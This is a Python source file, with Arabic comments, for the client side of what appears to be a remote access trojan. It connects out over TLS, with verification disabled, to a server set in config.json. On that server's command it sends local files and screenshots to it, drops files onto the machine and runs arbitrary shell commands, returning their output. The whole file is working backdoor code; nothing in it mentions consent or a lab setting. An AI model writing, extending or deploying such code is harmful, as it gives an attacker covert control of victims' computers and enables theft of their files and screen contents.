import socket
import ssl
import os
import pyautogui
import json
import logging
import zipfile
import time
import subprocess

# إعداد السجل لتسجيل العمليات
logging.basicConfig(filename='client.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# تحميل الإعدادات من ملف config.json
with open('config.json', 'r', encoding='utf-8') as config_file:
    config = json.load(config_file)

SERVER_IP = config['server_ip']
SERVER_PORT = config['server_port']

def receive_commands(host, port):
    """الاتصال بالخادم وتنفيذ الأوامر."""
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        secure_client = context.wrap_socket(client_socket, server_hostname=host)
        secure_client.connect((host, port))
        logging.info("[INFO] Connected to the server.")
    except Exception as e:
        logging.error(f"[ERROR] Connection failed: {e}")
        print("[ERROR] Unable to connect to the server.")
        return

    try:
        while True:
            command = secure_client.recv(1024).decode()
            if command.lower() == "exit":
                secure_client.send(b"[INFO] Client disconnected.")
                break
            elif command.startswith("upload"):
                _, filepath = command.split("*")
                upload_file_in_chunks(secure_client, filepath)
            elif command.startswith("download"):
                _, filename = command.split("*")
                download_file(secure_client, filename)
            elif command.lower() == "screenshot":
                take_screenshot(secure_client)
            elif command.startswith("run"):
                _, cmd = command.split("*")
                output = run_command(cmd)
                secure_client.sendall(output.encode())
            else:
                secure_client.send(f"[ERROR] Unknown command: {command}".encode())
                logging.warning(f"Unknown command received: {command}")
    except Exception as e:
        logging.error(f"[ERROR] {e}")
    finally:
        secure_client.close()

def upload_file_in_chunks(secure_client, filepath):
    """رفع ملف كبير إلى الخادم على أجزاء."""
    try:
        if not os.path.exists(filepath):
            secure_client.send(f"[ERROR] File not found: {filepath}".encode())
            logging.error(f"[ERROR] File not found: {filepath}")
            return

        zip_path = compress_file(filepath)
        filesize = os.path.getsize(zip_path)
        secure_client.send(f"upload*{os.path.basename(zip_path)}*{filesize}".encode())
        secure_client.recv(1024).decode()

        with open(zip_path, "rb") as file:
            while chunk := file.read(4096):
                secure_client.sendall(chunk)
        
        logging.info(f"[INFO] Uploaded file: {zip_path}")
        secure_client.send(b"[INFO] File uploaded successfully.")
        os.remove(zip_path)
    except Exception as e:
        secure_client.send(f"[ERROR] Could not upload file: {filepath}".encode())
        logging.error(f"[ERROR] {e}")

def download_file(secure_client, filename):
    """تنزيل ملف من الخادم."""
    secure_client.send(f"download*{filename}".encode())
    response = secure_client.recv(1024).decode()

    if response.startswith("filedata"):
        _, filesize = response.split("*")
        filesize = int(filesize)
        secure_client.send(b"[INFO] Ready to receive file.")

        received_data = b""
        while len(received_data) < filesize:
            packet = secure_client.recv(min(4096, filesize - len(received_data)))
            if not packet:
                break
            received_data += packet

        with open(filename, "wb") as file:
            file.write(received_data)

        logging.info(f"[INFO] File downloaded successfully: {filename}")
        print(f"[INFO] File received successfully: {filename}")
        secure_client.send(b"[INFO] File downloaded successfully.")
    else:
        logging.error(f"[ERROR] {response}")
        print(f"[ERROR] {response}")

def take_screenshot(secure_client):
    """التقاط صورة للشاشة وإرسالها للخادم."""
    time.sleep(2)
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    upload_file_in_chunks(secure_client, "screenshot.png")
    os.remove("screenshot.png")
    logging.info("[INFO] Screenshot taken and sent to the server.")

def compress_file(file_path):
    """ضغط الملفات قبل الإرسال."""
    zip_path = file_path + ".zip"
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(file_path, os.path.basename(file_path))
    return zip_path

def run_command(command):
    """تشغيل أوامر النظام وإرجاع المخرجات."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"[ERROR] {str(e)}"

if __name__ == "__main__":
    receive_commands(SERVER_IP, SERVER_PORT)
